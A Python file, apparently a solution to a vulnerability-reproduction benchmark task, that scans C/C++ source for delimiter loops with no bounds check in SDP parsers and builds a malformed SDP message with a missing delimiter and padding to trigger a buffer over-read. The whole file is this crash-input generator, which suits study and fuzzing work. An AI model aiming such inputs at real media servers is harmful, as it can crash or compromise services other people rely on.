import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    _ALLOWED_EXTS = {
        ".c",
        ".cc",
        ".cpp",
        ".cxx",
        ".h",
        ".hh",
        ".hpp",
        ".hxx",
        ".inc",
        ".inl",
        ".ipp",
        ".tcc",
        ".m",
        ".mm",
        ".rs",
        ".go",
        ".java",
    }

    _KNOWN_ATTRS = [
        "fingerprint",
        "fmtp",
        "rtpmap",
        "extmap",
        "rtcp-fb",
        "ssrc",
        "candidate",
        "group",
        "rid",
        "simulcast",
        "msid",
        "ice-ufrag",
        "ice-pwd",
        "setup",
        "sctp-port",
        "max-message-size",
        "bundle",
    ]

    def _iter_source_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if st.st_size <= 0 or st.st_size > 2_000_000:
                        continue
                    rel = os.path.relpath(p, src_path)
                    try:
                        with open(p, "rb") as f:
                            yield rel, f.read()
                    except OSError:
                        continue
            return

        if tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        if m.size <= 0 or m.size > 2_000_000:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        yield m.name, data
            except Exception:
                return

    def _collect_relevant_texts(self, src_path: str) -> List[str]:
        texts: List[str] = []
        primary: List[Tuple[str, bytes]] = []
        secondary: List[Tuple[str, bytes]] = []

        for name, data in self._iter_source_files(src_path):
            lname = name.lower()
            ext = os.path.splitext(lname)[1]
            if ext and ext not in self._ALLOWED_EXTS:
                continue
            if "sdp" in lname or "parser" in lname or "fuzz" in lname:
                primary.append((name, data))
            else:
                secondary.append((name, data))

        def add_texts(items: List[Tuple[str, bytes]], cap: int) -> None:
            for _, data in items:
                if len(texts) >= cap:
                    break
                try:
                    t = data.decode("utf-8", "ignore")
                except Exception:
                    try:
                        t = data.decode("latin-1", "ignore")
                    except Exception:
                        continue
                if t:
                    texts.append(t)

        add_texts(primary, 80)

        if not texts:
            picked = 0
            for _, data in secondary:
                if picked >= 200:
                    break
                if len(data) > 300_000:
                    continue
                ld = data.lower()
                if b"sdp" not in ld and b"rtpmap" not in ld and b"fmtp" not in ld and b"fingerprint" not in ld:
                    continue
                try:
                    t = data.decode("utf-8", "ignore")
                except Exception:
                    try:
                        t = data.decode("latin-1", "ignore")
                    except Exception:
                        continue
                if t:
                    texts.append(t)
                    picked += 1

        return texts

    def _scan_unbounded_conditions(self, text: str) -> List[Tuple[int, str, str]]:
        res: List[Tuple[int, str, str]] = []
        low = text.lower()

        for m in re.finditer(r"\bwhile\s*\(([^)]{1,240})\)", text, flags=re.DOTALL):
            cond = m.group(1)
            c_low = cond.lower()
            if "*" not in cond and "[" not in cond:
                continue
            if "!=" not in cond or "'" not in cond:
                continue
            if any(tok in c_low for tok in (" end", ".end", "size", "length", "<", ">", "<=", ">=", "==", "&&", "||")):
                continue
            dm = re.search(r"!=\s*'([^']{1,3})'", cond)
            if not dm:
                continue
            delim = dm.group(1)
            res.append((m.start(), delim, cond))

        for m in re.finditer(r"\bfor\s*\(([^)]{1,240})\)", text, flags=re.DOTALL):
            cond = m.group(1)
            c_low = cond.lower()
            if "*" not in cond and "[" not in cond:
                continue
            if "!=" not in cond or "'" not in cond:
                continue
            if any(tok in c_low for tok in (" end", ".end", "size", "length", "<", ">", "<=", ">=", "&&", "||")):
                continue
            dm = re.search(r"!=\s*'([^']{1,3})'", cond)
            if not dm:
                continue
            delim = dm.group(1)
            res.append((m.start(), delim, cond))

        if not res:
            # line-based fallback
            for lm in re.finditer(r"^[^\n]{0,500}$", text, flags=re.MULTILINE):
                line = lm.group(0)
                llow = line.lower()
                if "while" not in llow and "for" not in llow:
                    continue
                if "*" not in line and "[" not in line:
                    continue
                if "!=" not in line or "'" not in line:
                    continue
                if any(tok in llow for tok in (" end", ".end", "size", "length", "<", ">", "<=", ">=", "&&", "||")):
                    continue
                dm = re.search(r"!=\s*'([^']{1,3})'", line)
                if not dm:
                    continue
                delim = dm.group(1)
                res.append((lm.start(), delim, line))

        return res

    def _choose_trigger(self, texts: List[str]) -> Tuple[str, str]:
        present: Dict[str, int] = {k: 0 for k in self._KNOWN_ATTRS}
        for t in texts:
            tl = t.lower()
            for k in self._KNOWN_ATTRS:
                if k in tl:
                    present[k] += 1

        best_attr = ""
        best_delim = " "
        best_score = -1

        for t in texts:
            tl = t.lower()
            candidates = self._scan_unbounded_conditions(t)
            for pos, delim, _ in candidates:
                window = tl[max(0, pos - 1200) : min(len(tl), pos + 1200)]
                score = 0

                w_has = {}
                for k in self._KNOWN_ATTRS:
                    if k in window:
                        w_has[k] = True
                        score += 3

                if delim == "=":
                    score += 6
                elif delim == "/":
                    score += 5
                elif delim == " ":
                    score += 3

                if "fmtp" in w_has and delim == "=":
                    score += 10
                if "rtpmap" in w_has and delim in ("/", " "):
                    score += 10
                if "fingerprint" in w_has and delim == " ":
                    score += 10
                if "extmap" in w_has and delim == " ":
                    score += 7
                if "rtcp-fb" in w_has and delim == " ":
                    score += 7

                # infer attr
                attr = ""
                if "fingerprint" in w_has:
                    attr = "fingerprint"
                elif "fmtp" in w_has or delim == "=":
                    attr = "fmtp"
                elif "rtpmap" in w_has or delim == "/":
                    attr = "rtpmap"
                elif "extmap" in w_has:
                    attr = "extmap"
                elif "rtcp-fb" in w_has:
                    attr = "rtcp-fb"
                elif "candidate" in w_has:
                    attr = "candidate"
                elif "ssrc" in w_has:
                    attr = "ssrc"
                elif "group" in w_has:
                    attr = "group"
                elif "rid" in w_has:
                    attr = "rid"

                if not attr:
                    continue

                if score > best_score:
                    best_score = score
                    best_attr = attr
                    best_delim = delim

        if best_attr:
            return best_attr, best_delim

        # fallback by presence
        if present.get("fingerprint", 0) > 0:
            return "fingerprint", " "
        if present.get("fmtp", 0) > 0:
            return "fmtp", "="
        if present.get("rtpmap", 0) > 0:
            return "rtpmap", "/"
        if present.get("extmap", 0) > 0:
            return "extmap", " "
        if present.get("rtcp-fb", 0) > 0:
            return "rtcp-fb", " "
        return "fmtp", "="

    def _build_sdp(self, attr: str, delim: str) -> bytes:
        filler = "A" * 64

        base = [
            "v=0",
            "o=- 0 0 IN IP4 127.0.0.1",
            "s=-",
            "t=0 0",
        ]

        media = [
            "m=audio 9 RTP/AVP 111",
            "c=IN IP4 0.0.0.0",
        ]

        session_level = {"fingerprint", "group"}
        needs_media = attr not in session_level

        if attr == "fingerprint":
            # Expect "<hash> <fingerprint>", omit the space-delimited fingerprint.
            bad = f"a=fingerprint:sha-256{filler}"
            lines = base + [bad] + media + ["a=rtpmap:111 opus/48000/2"]
        elif attr == "fmtp":
            # Expect key=value pairs; omit '='.
            bad = f"a=fmtp:111 minptime{filler}"
            lines = base + media + ["a=rtpmap:111 opus/48000/2", bad]
        elif attr == "rtpmap":
            # Try to omit a required delimiter inside encoding spec.
            if delim == "/":
                bad = f"a=rtpmap:111 opus{filler}"
            else:
                bad = f"a=rtpmap:111{filler}"
            lines = base + media + [bad]
        elif attr == "extmap":
            bad = f"a=extmap:1{filler}"
            lines = base + media + [bad]
        elif attr == "rtcp-fb":
            bad = f"a=rtcp-fb:111{filler}"
            lines = base + media + ["a=rtpmap:111 opus/48000/2", bad]
        elif attr == "ssrc":
            bad = f"a=ssrc:1{filler}"
            lines = base + media + [bad]
        elif attr == "candidate":
            bad = f"a=candidate:1 1 UDP 1 0.0.0.0 9 typ{filler}"
            lines = base + media + [bad]
        elif attr == "group":
            bad = f"a=group:BUNDLE{filler}"
            lines = base + [bad] + media + ["a=mid:0"]
        elif attr == "rid":
            bad = f"a=rid:1{filler}"
            lines = base + media + [bad]
        else:
            # generic fallback most likely to be parsed
            bad = f"a=fmtp:111 minptime{filler}"
            lines = base + media + ["a=rtpmap:111 opus/48000/2", bad]

        sdp = "\n".join(lines)
        return sdp.encode("ascii", "ignore")

    def solve(self, src_path: str) -> bytes:
        texts = self._collect_relevant_texts(src_path)
        attr, delim = self._choose_trigger(texts)
        return self._build_sdp(attr, delim)